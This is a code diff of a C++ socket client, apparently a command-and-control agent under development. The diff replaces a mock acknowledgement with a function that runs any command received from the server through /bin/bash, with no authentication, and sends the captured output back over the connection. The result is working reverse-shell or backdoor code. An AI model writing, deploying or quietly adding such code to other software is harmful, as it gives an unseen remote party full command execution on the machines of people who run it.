@@ -2,6 +2,7 @@
 #include <vector>
 #include <string>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <cstring>
@@ -19,6 +20,45 @@ bool read_exact(int sock, uint8_t* buffer, size_t size) {
         total_read += bytes_read;
     }
     return true;
+}
+
+std::string execute_command(const std::string& command) {
+    int pipefd[2];
+    if (pipe(pipefd) == -1) {
+        return "Error during creating pipe";
+    }
+
+    pid_t pid = fork();
+    if (pid == -1) {
+        return "Error fork()";
+    }
+
+    if (pid == 0) {
+        dup2(pipefd[1], STDOUT_FILENO);
+        dup2(pipefd[1], STDERR_FILENO);
+
+        close(pipefd[0]);
+        close(pipefd[1]);
+
+        execl("/bin/bash", "sh", "-c", command.c_str(), nullptr);
+
+        exit(1);
+    } else {
+        close(pipefd[1]);
+
+        std::string out;
+        char buffer[4096];
+        ssize_t bytes_read;
+
+        while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
+            out.append(buffer, bytes_read);
+        }
+        close(pipefd[0]);
+
+        waitpid(pid, nullptr, 0);
+
+        return out;
+    }
 }
 
 int main() {
@@ -44,32 +84,30 @@ int main() {
     }
     std::cout << "Connected\n";
 
-    PacketHeader header{};
-    if (!read_exact(sock, reinterpret_cast<uint8_t*>(&header), sizeof(header))) {
+    PacketHeader req_header{};
+    if (!read_exact(sock, reinterpret_cast<uint8_t*>(&req_header), sizeof(req_header))) {
         std::cerr << "Error during receiving header!\n";
         close(sock);
         return 1;
-    }
+    } else {
+        req_header.command_id = ntohl(req_header.command_id);
+        req_header.data_len = ntohl(req_header.data_len);
 
-    header.command_id = ntohl(header.command_id);
-    header.data_len = ntohl(header.data_len);
+        if (req_header.command_id == 1 && req_header.data_len > 0) {
+            std::vector<uint8_t> payload_buffer(req_header.data_len);
+            if (read_exact(sock, payload_buffer.data(), req_header.data_len)) {
+                std::string command(payload_buffer.begin(), payload_buffer.end());
 
-    std::cout << "Received header: ID = " << header.command_id << " len = " << header.data_len << " bytes\n";
+                std::string result = execute_command(command);
 
-    if (header.data_len > 0) {
-        std::vector<uint8_t> payload_buffer(header.data_len);
-        if (!read_exact(sock, payload_buffer.data(), header.data_len)) {
-            std::cerr << "Error during receiving data\n";
-            close(sock);
-            return 1;
+                PacketHeader resp_header{};
+                resp_header.command_id = htonl(1);
+                resp_header.data_len = htonl(result.size());
+
+                send(sock, &resp_header, sizeof(resp_header), 0);
+                send(sock, result.c_str(), result.size(), 0);
+            }
         }
-
-        std::string command(payload_buffer.begin(), payload_buffer.end());
-        std::cout << "Command has been executed: " << command << "\n";
-
-        std::string mock_reply = "ACK: Received command " + command;
-        send(sock, mock_reply.c_str(), mock_reply.size(), 0);
-
     }
 
     close(sock);
